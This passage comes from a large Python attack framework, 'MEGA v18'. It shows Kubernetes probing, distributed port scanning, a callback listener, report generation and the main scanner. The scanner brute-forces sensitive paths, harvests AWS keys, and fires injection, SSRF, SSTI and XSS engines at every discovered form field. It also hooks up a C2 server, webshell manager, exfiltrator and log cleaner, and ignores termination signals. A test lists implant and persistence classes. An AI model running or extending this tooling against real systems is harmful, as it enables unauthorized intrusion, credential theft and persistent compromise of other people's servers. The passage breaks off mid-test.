            if self.srv: self.srv.shutdown()


# ═══════════════════════════════════════════════════════════════
# SECTION 25 — K8s PROBE + BOOTSTRAP (#5)
# ═══════════════════════════════════════════════════════════════
def _tcp(host, port, timeout=2.0):
    try:
        s = socket.socket(); s.settimeout(timeout)
        rc = s.connect_ex((host, port)); s.close()
        return rc == 0
    except Exception:
        return False


class K8sProbe:
    @staticmethod
    def detect_backend():
        kc = os.environ.get("KUBECONFIG", str(Path.home() / ".kube" / "config"))
        if not os.path.exists(kc):
            return ("none", False)
        kubectl = shutil.which("kubectl")
        if not kubectl:
            return ("kubeconfig_only", True)
        try:
            r = subprocess.run([kubectl, "get", "nodes", "-o", "json"],
                                capture_output=True, text=True, timeout=10,
                                env={**os.environ, "KUBECONFIG": kc})
            if r.returncode == 0:
                data = json.loads(r.stdout)
                if not data.get("items"):
                    return ("kubectl_no_nodes", True)
                try:
                    r2 = subprocess.run([kubectl, "config", "current-context"],
                                         capture_output=True, text=True, timeout=5)
                    ctx = r2.stdout.strip()
                except Exception:
                    ctx = ""
                if ctx.startswith("kind-"): return ("kind", True)
                if "minikube" in ctx: return ("minikube", True)
                if "k3s" in ctx or "k3d" in ctx: return ("k3d", True)
                return ("kubectl_generic", True)
        except Exception as e:
            return (f"kubectl_error: {e!r}", True)
        return ("kubeconfig_unreadable", True)

    @staticmethod
    def has_kind_binary(): return shutil.which("kind") is not None
    @staticmethod
    def has_minikube_binary(): return shutil.which("minikube") is not None

    @staticmethod
    def test_api_reachable():
        kc = os.environ.get("KUBECONFIG", str(Path.home() / ".kube" / "config"))
        if not os.path.exists(kc):
            return False, "no kubeconfig"
        try:
            import yaml as _yaml
            with open(kc, "r", encoding="utf-8") as f:
                cfg = _yaml.safe_load(f)
            ctx_name = cfg.get("current-context", "")
            ctx = next((c for c in cfg.get("contexts", []) if c.get("name") == ctx_name), None)
            if not ctx: return False, "no context"
            cluster_name = ctx["context"].get("cluster")
            cluster = next((c for c in cfg.get("clusters", []) if c.get("name") == cluster_name), None)
            if not cluster: return False, "no cluster"
            server = cluster["cluster"].get("server", "")
            if not server: return False, "no server"
            parsed = urlparse(server)
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
            return _tcp(host, port, timeout=3), server
        except Exception as e:
            return False, repr(e)

    @staticmethod
    def bootstrap_kind(cluster_name="mega-test"):
        """FIX #5: create a real kind cluster. Returns (ok, msg)."""
        if not K8sProbe.has_kind_binary():
            return False, "kind binary not installed (https://kind.sigs.k8s.io)"
        try:
            # Check if cluster exists
            r = subprocess.run(["kind", "get", "clusters"],
                                capture_output=True, text=True, timeout=10)
            existing = r.stdout.strip().splitlines() if r.returncode == 0 else []
            if cluster_name in existing:
                return True, f"cluster '{cluster_name}' already exists"
            # Create
            r = subprocess.run(
                ["kind", "create", "cluster", "--name", cluster_name,
                 "--wait", f"{KIND_BOOTSTRAP_TIMEOUT}s"],
                capture_output=True, text=True, timeout=KIND_BOOTSTRAP_TIMEOUT + 30)
            if r.returncode != 0:
                return False, f"kind create failed: {r.stderr[:300]}"
            return True, f"cluster '{cluster_name}' created"
        except subprocess.TimeoutExpired:
            return False, f"kind create timed out after {KIND_BOOTSTRAP_TIMEOUT}s"
        except Exception as e:
            return False, repr(e)

    @staticmethod
    def delete_kind(cluster_name="mega-test"):
        if not K8sProbe.has_kind_binary(): return False
        try:
            r = subprocess.run(["kind", "delete", "cluster", "--name", cluster_name],
                                capture_output=True, text=True, timeout=60)
            return r.returncode == 0
        except Exception:
            return False


# ═══════════════════════════════════════════════════════════════
# SECTION 26 — DISTRIBUTED
# ═══════════════════════════════════════════════════════════════
@dataclass
class Task:
    task_id: str; kind: str; target: str
    payload: Dict[str, Any] = field(default_factory=dict)
    priority: int = 5
    def to_dict(self): return asdict(self)

class DistributedBus:
    def __init__(self, state_db, logger=None):
        self.db = state_db; self.logger = logger
    def submit(self, task):
        try: self.db.push("tasks", task.to_dict()); return True
        except Exception: return False
    def submit_batch(self, tasks): return sum(1 for t in tasks if self.submit(t))
    def claim(self, worker_id, limit=1):
        try: return self.db.claim("tasks", worker_id, limit)
        except Exception: return []
    def complete(self, task_id): self.db.complete(task_id)
    def fail(self, task_id, err): self.db.fail(task_id, err)
    def put_result(self, task_id, payload, worker=""):
        self.db.put_result(task_id, payload, worker)
    def get_results(self): return self.db.get_results()
    def requeue_stale(self, seconds=300): self.db.requeue_stale("tasks", seconds)

class DistributedMaster:
    def __init__(self, bus, scanner, logger):
        self.bus = bus; self.s = scanner; self.logger = logger
    def build_port_tasks(self, host, ports):
        return [Task(str(uuid.uuid4()), "port_scan", host, {"port": p}, 5) for p in ports]
    def submit(self, tasks): return self.bus.submit_batch(tasks)
    def wait_and_merge(self, expected, timeout_s=600):
        t0 = time.time(); merged = {}
        while time.time() - t0 < timeout_s:
            got = self.bus.get_results()
            if len(got) >= expected: merged = got; break
            time.sleep(1); self.bus.requeue_stale(seconds=300)
        return {"results": merged, "partial": len(merged) < expected,
                "expected": expected, "received": len(merged)}

class DistributedWorker:
    def __init__(self, bus, scanner, node_id=None):
        self.bus = bus; self.s = scanner
        self.node_id = node_id or f"worker-{secrets.token_hex(4)}"
        self.stop_flag = False; self.processed = 0
    def _handle_port_scan(self, task):
        host = task["target"]; port = task["payload"].get("port")
        try:
            s = socket.socket(); s.settimeout(1.5)
            try: rc = s.connect_ex((host, int(port)))
            finally: s.close()
            return {"port": port, "open": rc == 0}
        except Exception as e: return {"port": port, "error": str(e)}
    def run(self, max_tasks=None, idle_timeout=30):
        idle_since = time.time()
        while not self.stop_flag:
            claimed = self.bus.claim(self.node_id, limit=1)
            if not claimed:
                if max_tasks and self.processed >= max_tasks: break
                if time.time() - idle_since > idle_timeout: break
                time.sleep(1); continue
            idle_since = time.time()
            item = claimed[0]; task_id = item["id"]; task = item["payload"]
            try:
                result = self._handle_port_scan(task)
                self.bus.put_result(task.get("task_id", str(task_id)),
                                     {"task_id": task.get("task_id"), "result": result,
                                      "worker": self.node_id},
                                     worker=self.node_id)
                self.bus.complete(task_id); self.processed += 1
            except Exception as e: self.bus.fail(task_id, str(e))


def _cluster_worker_main(worker_id, db_path, qname, max_tasks, idle_timeout, result_q):
    import sqlite3 as _sql, json as _json, time as _time, os as _os
    conn = _sql.connect(db_path, check_same_thread=False, timeout=30)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA busy_timeout=30000")
    pid = _os.getpid(); processed = 0; idle_since = _time.time()
    try:
        while processed < max_tasks:
            try:
                conn.execute("BEGIN IMMEDIATE")
                rows = conn.execute(
                    "SELECT id, payload FROM queue WHERE scope=? AND qname=? "
                    "AND claimed=0 ORDER BY id LIMIT 1",
                    (worker_id.split(":")[0], qname)).fetchall()
                if not rows:
                    conn.commit()
                    if _time.time() - idle_since > idle_timeout: break
                    _time.sleep(0.05); continue
                tid, payload = rows[0]
                conn.execute("UPDATE queue SET claimed=1, claimed_by=?, "
                             "claimed_ts=strftime('%s','now'), attempts=attempts+1 "
                             "WHERE id=?", (f"{worker_id}:{pid}", tid))
                conn.commit()
            except Exception:
                with _wrap_silent("cluster.claim"):
                    conn.rollback()
                _time.sleep(0.05); continue
            idle_since = _time.time()
            try:
                task = _json.loads(payload)
                result = {"worker": worker_id, "pid": pid,
                          "task_id": task.get("task_id", tid),
                          "value": task.get("value", 0) * 2}
                conn.execute("INSERT OR REPLACE INTO results(scope,task_id,payload,ts,worker) "
                             "VALUES (?,?,?,strftime('%s','now'),?)",
                             (worker_id.split(":")[0], str(task.get("task_id", tid)),
                              _json.dumps(result), f"{worker_id}:{pid}"))
                conn.execute("DELETE FROM queue WHERE id=?", (tid,))
                conn.commit(); processed += 1
            except Exception:
                with _wrap_silent("cluster.commit"):
                    conn.execute("UPDATE queue SET claimed=0, claimed_by=NULL, "
                                 "claimed_ts=NULL WHERE id=?", (tid,))
                    conn.commit()
    finally:
        try: result_q.put({"worker_id": worker_id, "pid": pid, "processed": processed})
        except Exception: pass
        with _wrap_silent("cluster.close"):
            conn.close()


# ═══════════════════════════════════════════════════════════════
# SECTION 27 — CALLBACK
# ═══════════════════════════════════════════════════════════════
class CallbackHandler(BaseHTTPRequestHandler):
    hits = []; lock = threading.Lock()
    def log_message(self, *a, **k): pass
    def do_GET(self):
        with CallbackHandler.lock:
            CallbackHandler.hits.append({"time": datetime.now(timezone.utc).isoformat(),
                                          "method": "GET", "path": self.path,
                                          "src": self.client_address[0]})
        with _wrap_silent("callback.reply"):
            self.send_response(200); self.send_header("Content-Type", "text/plain")
            self.end_headers(); self.wfile.write(b"ok")
    def do_POST(self):
        with CallbackHandler.lock:
            CallbackHandler.hits.append({"time": datetime.now(timezone.utc).isoformat(),
                                          "method": "POST", "path": self.path,
                                          "src": self.client_address[0]})
        with _wrap_silent("callback.reply"):
            self.send_response(200); self.send_header("Content-Type", "text/plain")
            self.end_headers(); self.wfile.write(b"ok")

class CallbackServer:
    def __init__(self, host="127.0.0.1", port=8888):
        self.host = host; self.port = port
        self.srv = None; self.thread = None
    def start(self):
        try:
            self.srv = ThreadingHTTPServer((self.host, self.port), CallbackHandler)
            self.thread = threading.Thread(target=self.srv.serve_forever, daemon=True)
            self.thread.start(); return True
        except Exception: return False
    def stop(self):
        with _wrap_silent("callback.stop"):
            if self.srv: self.srv.shutdown()


# ═══════════════════════════════════════════════════════════════
# SECTION 28 — REPORT
# ═══════════════════════════════════════════════════════════════
class ReportGenerator:
    def __init__(self, scanner, logger):
        self.s = scanner; self.logger = logger; self.screenshots = {}
    def _esc(self, s):
        return (str(s).replace("&", "&amp;").replace("<", "&lt;")
                .replace(">", "&gt;").replace('"', "&quot;"))
    def _sev_color(self, sev):
        return {"critical":"#b3001b","high":"#e25c00","medium":"#c9a800",
                "low":"#2e7d32","info":"#455a64"}.get(sev.lower(), "#455a64")
    def build_html(self, out_path):
        target = self.s.target
        results = self.s.rs.to_dict()
        vulns = results.get("data", {}).get("vulns", [])
        counts = {"critical":0,"high":0,"medium":0,"low":0,"info":0}
        for v in vulns: counts[v.get("severity","info")] = counts.get(v.get("severity","info"),0)+1
        rows = []
        for v in sorted(vulns, key=lambda x: -x.get("signal_score", 0)):
            sev = v.get("severity", "info"); color = self._sev_color(sev)
            rows.append(f"""<div style="border-left:6px solid {color};background:#141721;border-radius:8px;margin:12px 0;padding:12px;">
                <span style="background:{color};color:#fff;padding:2px 8px;border-radius:4px;font-size:12px;">{sev.upper()}</span>
                <strong>{self._esc(v.get('type'))}</strong>
                <code>{self._esc(v.get('url'))}</code></div>""")
        html = f"""<!DOCTYPE html><html><head><meta charset="utf-8">
<title>MEGA v{VERSION} Report</title></head><body style="font-family:system-ui;background:#0f1115;color:#e6e6e6;padding:24px;">
<h1>MEGA v{VERSION}</h1>
<p>Target: {self._esc(target)} | Trace: {self.s.logger.trace_id}</p>
<p>C: {counts['critical']} H: {counts['high']} M: {counts['medium']} L: {counts['low']} I: {counts['info']}</p>
{''.join(rows) if rows else '<p>No findings.</p>'}
</body></html>"""
        with open(out_path, "w", encoding="utf-8") as f: f.write(html)
        return out_path
    def generate(self):
        try: REPORT_DIR.mkdir(parents=True, exist_ok=True)
        except OSError: pass
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        name = re.sub(r"[^a-zA-Z0-9_\-]", "_", self.s.target or "auto")
        html_path = str(REPORT_DIR / f"report_{name}_{ts}.html")
        self.build_html(html_path)
        return {"html": html_path, "pdf": None}


# ═══════════════════════════════════════════════════════════════
# SECTION 29 — CONTEXT / PROGRESS / ENDPOINT
# ═══════════════════════════════════════════════════════════════
class Context:
    def __init__(self, target, logger):
        self.target = target; self.logger = logger
        self.rs = ResultStore(); self.lock = threading.RLock()
        self.rce_achieved = False; self.shells = []
        self.cloud_creds = []; self.db_dumps = []; self.lfi_params = []
        self.default_creds = []; self.lateral_targets = []; self.lateral_successes = []
        self.internal_services = []; self.exploit_suggestions = []
        self.c2_sessions = []; self.cloud_assets = []; self.k8s_assets = []
        self.cleanup_actions = []; self.defensive = {}
        self.persistence_modules = []
    def snapshot(self):
        with self.lock:
            return {"target": self.target, "rce_achieved": self.rce_achieved,
                    "shells": list(self.shells), "cloud_creds": list(self.cloud_creds),
                    "db_dumps": list(self.db_dumps), "lfi_params": list(self.lfi_params),
                    "default_creds": list(self.default_creds),
                    "lateral_targets": list(self.lateral_targets),
                    "lateral_successes": list(self.lateral_successes),
                    "internal_services": list(self.internal_services),
                    "exploit_suggestions": list(self.exploit_suggestions),
                    "c2_sessions": list(self.c2_sessions),
                    "cloud_assets": list(self.cloud_assets),
                    "k8s_assets": list(self.k8s_assets),
                    "cleanup_actions": list(self.cleanup_actions),
                    "defensive": self.defensive,
                    "persistence_modules": list(self.persistence_modules)}

class Progress:
    def __init__(self, weights):
        self.weights = dict(weights)
        self.total = sum(self.weights.values()) or 1
        self.done = defaultdict(int); self.lock = threading.Lock(); self._last = 0.0
    def advance(self, stage, n=1):
        with self.lock: self.done[stage] += n
    def fraction(self):
        with self.lock:
            return sum(min(self.done.get(k, 0), w) for k, w in self.weights.items()) / self.total
    def render(self, elapsed):
        if not T: return
        now = time.time()
        if now - self._last < 0.5: return
        self._last = now
        pct = int(self.fraction() * 100)
        print(f"\r[PROG] {'#'*(pct//4)}{'-'*(25-pct//4)} {pct}%   ", end="")

class Endpoint:
    def __init__(self, host, scheme=None, port=None, path="/"):
        self.host = host; self.scheme = scheme; self.port = port; self.path = path
    def candidates(self):
        if self.scheme: return [(self.scheme, self.port)]
        out = []
        for port, sch in [(443, "https"), (80, "http")]:
            if self.port and port != self.port: continue
            out.append((sch, port))
        return out
    def url(self, scheme=None, port=None):
        s = scheme or self.scheme or "https"
        p = port if port is not None else self.port
        if p and p not in (80, 443): return f"{s}://{self.host}:{p}{self.path}"
        return f"{s}://{self.host}{self.path}"
    def fetch(self, scanner, method="GET", **kw):
        for sch, port in self.candidates():
            r = scanner._request(method, self.url(sch, port), **kw)
            if r is not None:
                self.scheme, self.port = sch, port; return r
        return None


# ═══════════════════════════════════════════════════════════════
# SECTION 30 — MAIN SCANNER
# ═══════════════════════════════════════════════════════════════
class MegaV18:
    def __init__(self, target, bypass=False, workers=60, rps=100, timeout=10,
                 callback_host="", use_tor=False, lhost="", lport=4444,
                 auto_exploit=True, stealth=False,
                 oob_dns=True, lateral=True, report=False, screenshots=True,
                 exploit_db=False, evasion=False, c2=False,
                 c2_http_port=C2_HTTP_PORT, c2_dns_port=C2_DNS_PORT,
                 c2_bind=C2_BIND, c2_psk=C2_PSK,
                 ml=True, cloud=False, opsec=False, graph=True,
                 defensive=False, neo4j=False, oob_bind=OOB_BIND,
                 auto_cleanup=False, distributed=False, role="master",
                 verify_ssl=True, scope_allow=None, scope_deny=None):
        self.raw_target = target
        self.scope = ScopeGuard(allow=scope_allow, deny=scope_deny)
        self.scope.check(target)
        self.target = target.strip().lower().replace("https://", "").replace("http://", "").split("/")[0]
        self.start = time.time()
        self.workers = max(4, min(300, workers))
        self.task_timeout = max(3, min(60, timeout))
        self.auto_exploit = auto_exploit
        self.stealth = StealthController(enabled=stealth,
                                          max_threads=8 if stealth else 200)
        if stealth: self.workers = self.stealth.get_max_threads(self.workers)
        self.distributed = distributed; self.role = role

        self.lim_discovery = AdaptiveLimiter(rps_start=rps)
        self.lim_attack = AdaptiveLimiter(rps_start=max(10, rps // 2))
        self.breaker = CircuitBreaker()
        self.notifier = Notifier()

        ensure_dirs()
        self.pool = SessionPool(bypass, os.environ.get("SCAN_PROXY"),
                                 os.environ.get("SCAN_COOKIE"),
                                 tor=None, verify_ssl=verify_ssl)
        logname = str(LOG_DIR / f"log_{self.target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
        elk_path = str(ELK_DIR / f"elk_{self.target}_{datetime.now().strftime('%Y%m%d')}.jsonl")
        self.logfile = logname
        self.logger = Logger(logname, elk_path=elk_path)
        self.logger.log(f"MEGA v{VERSION} | target={self.target} | trace={self.logger.trace_id}", "info")

        self.ctx = Context(self.target, self.logger)
        self.rs = self.ctx.rs
        state_path = STATE_DIR / f"state_{re.sub(r'[^a-zA-Z0-9_]', '_', self.target)}.db"
        self.state = StateDB(str(state_path), scope_key=self.target)
        self.bus = DistributedBus(self.state, self.logger) if distributed else None
        self.master = DistributedMaster(self.bus, self, self.logger) if (distributed and role == "master") else None
        self.worker = DistributedWorker(self.bus, self) if (distributed and role == "worker") else None

        self.oob = OOBDNSServer(port=DNS_PORT, bind_addr=oob_bind) if oob_dns else None
        self.exploit_db = ExploitDB(self.logger) if exploit_db else None
        self.reporter = ReportGenerator(self, self.logger) if report else None
        self.ml = MLPrioritizer(self.logger, state_db=StateDB(
            str(STATE_DIR / "ml_state.db"), scope_key="ml")) if ml else None
        self.cloud = CloudEnumerator(self) if cloud else None
        self.opsec = OpsecCleaner(self.logger) if opsec else None
        self.graph = AttackGraph(self.logger, use_neo4j=neo4j, target=self.target) if graph else None
        self.defensive = DefensivePipeline(self.logger) if defensive else None
        self.c2 = None
        if c2:
            self.c2 = C2Server(c2_bind, c2_http_port, c2_dns_port,
                                psk=c2_psk, logger=self.logger)

        self.sqli = SQLiEngine(self); self.lfi = LFIEngine(self)
        self.cmdi = CMDIEngine(self); self.xss = XSSAnalyzer(self)
        self.ssrf = SSRFEngine(self); self.ssti = SSTIEngine(self)
        self.domxss = DOMXSSScanner(self); self.pd = ParamDiscovery(self)
        self.ldap = LDAPTester(self); self.xpath = XPathTester(self)
        self.cred = CredTester(self); self.webshell = WebshellManager(self)
        self.exfil = Exfiltrator(self.logger)

        cb_host, cb_port = parse_host_port(callback_host, CALLBACK_PORT, "127.0.0.1")
        self.callback_srv = CallbackServer(cb_host, cb_port) if callback_host else None

        self.ports_list = self._build_ports()
        self.dirs_list = self._default_dirs()
        self.progress = Progress({"ports": max(1, len(self.ports_list) // 20),
                                    "dirs": len(self.dirs_list), "sensitive": 100,
                                    "attack": 300, "cloud": 40})

        try:
            signal.signal(signal.SIGTERM, lambda *a: None)
            signal.signal(signal.SIGINT, lambda *a: None)
        except Exception: pass
        atexit.register(self._cleanup)

    def _cleanup(self):
        for s in (self.oob, self.callback_srv, self.c2):
            with _wrap_silent("cleanup.stop"):
                if s: s.stop()
        with _wrap_silent("cleanup.state"):
            self.state.close()
        with _wrap_silent("cleanup.graph"):
            if self.graph: self.graph.close()
        with _wrap_silent("cleanup.notifier"):
            self.notifier.close()

    def _build_ports(self):
        mode = os.environ.get("PORTS_MODE", "quick").lower()
        if mode == "full": return list(range(1, 65536))
        return [21,22,23,25,53,80,81,110,135,139,143,389,443,445,465,587,636,993,
                995,1080,1433,1521,2049,2181,2222,2375,3000,3306,3389,3690,4000,
                4369,4443,5000,5432,5672,5900,5984,5985,6379,6443,7474,8000,8080,
                8081,8086,8088,8443,8888,9000,9042,9090,9200,9300,9418,9443,10000,
                10250,11211,15672,27017,27018,50000,50070,61616]

    def _default_dirs(self):
        return ["/","/admin","/login","/wp-admin","/phpmyadmin","/.git","/.env",
                "/robots.txt","/backup","/test","/dev","/api","/api/v1","/graphql",
                "/swagger","/docs","/phpinfo.php","/index.php","/.htaccess",
                "/web.config","/dump","/old","/archive","/downloads","/tmp",
                "/logs","/error","/debug","/status","/health","/manager/html",
                "/jenkins","/grafana","/kibana"]

    def _request(self, method, url, retries=2, category="discovery", **kw):
        host = urlparse(url).netloc
        if self.breaker.should_skip(host): return None
        self.stealth.wait_if_backoff()
        kw.setdefault("timeout", self.task_timeout)
        kw.setdefault("allow_redirects", True)
        kw.setdefault("verify", self.pool.verify_for(host))
        hdrs = kw.setdefault("headers", {})
        for k, v in HeaderMutator.base_headers().items():
            if k not in hdrs: hdrs[k] = v
        inject_trace_headers(hdrs)
        lim = self.lim_attack if category == "attack" else self.lim_discovery
        for attempt in range(retries + 1):
            lim.wait()
            if self.stealth.enabled: self.stealth.sleep()
            try:
                self.rs.inc("requests")
                with otel_span(f"http.{method.lower()}", {"method": method, "host": host}):
                    r = self.pool.get(host).request(method, url, **kw)
                if r.status_code in (429, 403, 503):
                    self.rs.inc("waf_blocks"); lim.penalize(); self.stealth.on_waf_hit()
                    if attempt < retries: time.sleep(1.5 * (attempt + 1)); continue
                else: lim.reward()
                self.breaker.success(host); return r
            except requests.exceptions.RequestException:
                self.breaker.record(host, "5xx"); self.rs.inc("errors")
                if attempt < retries: time.sleep(0.8 * (attempt + 1)); continue
                return None
            except Exception as e:
                self.logger.log(f"req: {url}", "error", exc=e); return None
        return None

    def get(self, url, **kw): return self._request("GET", url, **kw)
    def post(self, url, **kw): return self._request("POST", url, **kw)

    def _hit(self, finding):
        if not isinstance(finding, Finding): return
        sev = finding.severity()
        self.rs.add("vulns", finding.to_dict())
        if self.ml: self.ml.record_finding(finding.vtype)
        if self.graph:
            with _wrap_silent("scanner.graph_add"):
                self.graph.add_host(self.target)
                self.graph.add_vuln(self.target, finding.vtype, sev.value,
                                     finding.evidence, verified=finding.verified())
        if not finding.verified():
            self.logger.log(f"UNVERIFIED: {finding.vtype} @ {finding.url}", "warning")
            return
        lvl = "critical" if sev.value in ("critical", "high") else "warning"
        self.logger.log(f"[{sev.value.upper()} sig={round(finding.signal_score(), 2)}] "
                        f"{finding.vtype} @ {finding.url}", lvl)
        with _wrap_silent("scanner.notify"):
            self.notifier.send(f"[{sev.value.upper()}] {finding.vtype}\n{finding.url}")

    def stage_ports(self):
        self.logger.log(f"Port scan: {len(self.ports_list)}", "info")
        def worker(p):
            s = socket.socket(); s.settimeout(1.0)
            try:
                if s.connect_ex((self.target, p)) == 0: return p
            finally:
                with _wrap_silent("port.close"):
                    s.close()
            return None
        with ThreadPoolExecutor(max_workers=min(200, self.workers * 3)) as ex:
            for fut in as_completed([ex.submit(worker, p) for p in self.ports_list]):
                try: r = fut.result(timeout=0.5)
                except Exception: r = None
                if r:
                    self.rs.add("ports", r); self.logger.log(f"Port {r} OPEN", "found")
                self.progress.advance("ports")

    def stage_dirs(self):
        def worker(d):
            ep = Endpoint(self.target, path=d)
            for sch, port in ep.candidates():
                r = self.get(ep.url(sch, port), timeout=5, allow_redirects=False)
                if r: return (d, r)
            return None
        with ThreadPoolExecutor(max_workers=self.stealth.get_max_threads(self.workers)) as ex:
            for fut in as_completed([ex.submit(worker, d) for d in self.dirs_list]):
                try: entry = fut.result(timeout=0.5)
                except Exception: entry = None
                if entry:
                    d, r = entry
                    if r.status_code in (200,201,301,302,401,403,500):
                        self.rs.add("dirs", {"path": d, "status": r.status_code})
                        if r.status_code == 200 and r.text:
                            self.rs.dset("dir_bodies", d, r.text[:300000])
                self.progress.advance("dirs")

    def stage_sensitive(self):
        patterns = {"AWS Key": r"AKIA[0-9A-Z]{16}"}
        seen = set()
        for d, body in list(self.rs.ditems("dir_bodies"))[:100]:
            for name, pat in patterns.items():
                for m in re.finditer(pat, body):
                    val = m.group(0)[:80]; key = f"{name}|{val[:40]}"
                    if key in seen: continue
                    seen.add(key)
                    f = Finding(f"https://{self.target}{d}", f"Sensitive {name}")
                    f.evidence = {"val": val, "path": d, "redacted": _redact_cred(val)}
                    f.add_signal("regex_match", 0.4, name)
                    f.add_signal("context_keyword", 0.4)
                    self.rs.add("sensitive_data", f.to_dict(), dedup_on=key)
                    self._hit(f)
            self.progress.advance("sensitive")

    def stage_cloud(self):
        if not self.cloud: return
        with _wrap_silent("stage.cloud"):
            results = self.cloud.run(self.target, f"https://{self.target}")
            for provider, items in results.items():
                for it in items:
                    self.ctx.cloud_assets.append({"provider": provider, **it})
        self.progress.advance("cloud", 40)

    def stage_attack(self):
        bodies = list(self.rs.ditems("dir_bodies"))[:40]
        jobs = []
        for d, body in bodies:
            url = f"https://{self.target}{d}"
            for m in re.finditer(r'name=["\']([a-zA-Z0-9_\-]{2,40})["\']', body):
                jobs.append((url, m.group(1), "GET"))
        def worker(job):
            try: self._attack_one(job[0], job[1], job[2])
            except Exception: pass
            self.progress.advance("attack", max(1, 300 // max(1, len(jobs))))
        with ThreadPoolExecutor(max_workers=max(4, self.workers // 3)) as ex:
            list(ex.map(worker, jobs))

    def _attack_one(self, url, p, method="GET"):
        for engine, rec_key in [(self.sqli.error_based, "sqli_error"),
                                 (self.lfi.test, None),
                                 (self.cmdi.test, None),
                                 (self.ssrf.test, None),
                                 (self.ssti.test, None),
                                 (self.ldap.test, None),
                                 (self.xpath.test, None)]:
            try:
                f = engine(url, p, method)
                if f:
                    self._hit(f)
                    if self.ml and rec_key: self.ml.record_payload(rec_key, True)
            except Exception as e:
                SilentPassLogger.swallowed(f"attack.{engine.__name__}", e)
        try:
            for f in self.xss.test(url, p, method): self._hit(f)
        except Exception as e:
            SilentPassLogger.swallowed("attack.xss", e)

    def stage_graph(self):
        if not self.graph: return
        with _wrap_silent("stage.graph"):
            self.graph.add_host(self.target)
            for v in self.rs.snapshot("vulns"):
                if isinstance(v, dict):
                    self.graph.add_vuln(self.target, v.get("type", "?"),
                                         v.get("severity", "info"),
                                         v.get("evidence", {}),
                                         verified=v.get("verified", False))
            self.graph.save()
            self.logger.log(f"Graph: {self.graph.stats()}", "info")

    def stage_defensive(self):
        if not self.defensive: return
        with _wrap_silent("stage.defensive"):
            findings = self.rs.snapshot("vulns")
            out = self.defensive.run(findings)
            self.ctx.defensive = {"sigma_count": len(out.get("sigma_rules", [])),
                                    "yara_count": len(out.get("yara_rules", [])),
                                    "hardening_count": len(out.get("hardening", [])),
                                    "correlations": out.get("correlations", [])}

    def stage_opsec(self):
        if not self.opsec: return
        with _wrap_silent("stage.opsec"):
            paths = self.opsec.save_scripts()
            self.ctx.cleanup_actions.append(paths)

    def stage_distributed(self):
        if not self.master or not self.bus: return
        n = self.master.submit(self.master.build_port_tasks(self.target, self.ports_list))
        out = self.master.wait_and_merge(n, timeout_s=120)
        if out["partial"]:
            self.logger.log(f"Partial distributed: {out['received']}/{out['expected']}", "warning")

    def summary(self):
        el = int(time.time() - self.start)
        print(f"\n{BOLD}{C}=== MEGA v{VERSION} SUMMARY ==={N}")
        print(f"{Y}Time:{N} {el}s | {Y}Vulns:{N} {self.rs.count('vulns')} | {Y}RCE:{N} {self.ctx.rce_achieved}")
        print(f"{G}Log: {self.logfile}{N}")

    def run(self):
        print(BOLD + M + f" MEGA v{VERSION} - HONEST EDITION " + N)
        print(B + f"Target: {self.target} | Trace: {self.logger.trace_id}" + N)
        if STRICT_MODE:
            print(Y + "[!] STRICT MODE: swallowed exceptions will raise" + N)

        if self.callback_srv and self.callback_srv.start():
            print(G + f"[+] Callback {self.callback_srv.host}:{self.callback_srv.port}" + N)
        if self.oob and self.oob.start():
            print(G + f"[+] OOB DNS {self.oob.bind_addr}:{DNS_PORT}" + N)
        if self.c2 and self.c2.start():
            print(G + f"[+] C2 HTTPS={self.c2_http_port}" + N)

        if self.distributed and self.role == "worker" and self.worker:
            self.worker.run(idle_timeout=60); self.summary(); return

        try:
            self.stage_ports(); self.stage_dirs(); self.stage_sensitive()
            self.stage_cloud(); self.stage_attack(); self.stage_graph()
            self.stage_defensive(); self.stage_opsec()
            if self.distributed and self.master: self.stage_distributed()
        except KeyboardInterrupt:
            self.logger.log("Interrupted", "warning")
        except Exception as e:
            self.logger.log(f"Pipeline crash: {e}", "critical", exc=e)

        if self.reporter:
            with _wrap_silent("stage.report"):
                rep = self.reporter.generate()
                print(G + f"Report: {rep['html']}" + N)

        self.summary()
        swallowed = SilentPassLogger.report()
        if swallowed:
            print(Y + f"[!] Swallowed exceptions summary: {dict(swallowed)}" + N)
        self._cleanup()


# ═══════════════════════════════════════════════════════════════
# SECTION 31 — MODULE PRESENCE TEST (#15)
# ═══════════════════════════════════════════════════════════════
class TestV17ModulePresence(unittest.TestCase):
    """FIX #15: verify every V17.1 module exists in V18.1."""
    REQUIRED_CLASSES = [
        # scanner core
        "MegaV18", "SQLiEngine", "LFIEngine", "CMDIEngine", "XSSAnalyzer",
        "SSRFEngine", "SSTIEngine",
        # restored
        "DOMXSSScanner", "ParamDiscovery", "LDAPTester", "XPathTester",
        "CredTester", "WebshellManager", "Exfiltrator",
        # c2
        "C2Server", "C2Implant", "ImplantPersistence", "C2Auth", "C2Session",
        # intel
        "MLPrioritizer", "AttackGraph", "CloudEnumerator", "ExploitDB",
        # defensive
        "DefensivePipeline", "SigmaGenerator", "YaraGenerator",
        "HardeningAdvisor", "DefensiveCorrelator",
        # opsec
        "OpsecCleaner",
        # distributed
        "DistributedBus", "DistributedMaster", "DistributedWorker", "Task",
        # infra
        "Logger", "StateDB", "ResultStore", "Finding", "Signal",
        "SessionPool", "Endpoint", "ScopeGuard", "Notifier",
        "CallbackServer", "ReportGenerator", "Context",
        # v18.1 new
        "SigmaEngine", "SplunkBackend", "SentinelBackend", "K8sProbe",
        "SilentPassLogger", "CoverageRunner",
    ]
    REQUIRED_FUNCS = [
        "parse_host_port",
    ]
    def test_all_classes_present(self):
        mod = sys.modules[__name__]
        missing = [c for c in self.REQUIRED_CLASSES if not hasattr(mod, c)]
        self.assertEqual(missing, [], f"missing classes: {missing}")
    def test_all_funcs_present(self):
        mod = sys.modules[__name__]
        missing = [f for f in self.REQUIRED_FUNCS if not hasattr(mod, f)]
        self.assertEqual(missing, [], f"missing funcs: {missing}")
    def test_scan_methods_present(self):
        """Scanner engines must have their entry methods."""
        checks = [
            (SQLiEngine, "error_based"), (SQLiEngine, "time_blind"),
            (LFIEngine, "test"), (LFIEngine, "log_poison"),
            (CMDIEngine, "test"), (XSSAnalyzer, "test"),
            (SSRFEngine, "test"), (SSTIEngine, "test"),
            (DOMXSSScanner, "scan"), (ParamDiscovery, "discover"),
            (LDAPTester, "test"), (XPathTester, "test"),
            (CredTester, "test_all"), (WebshellManager, "exec_cmd"),
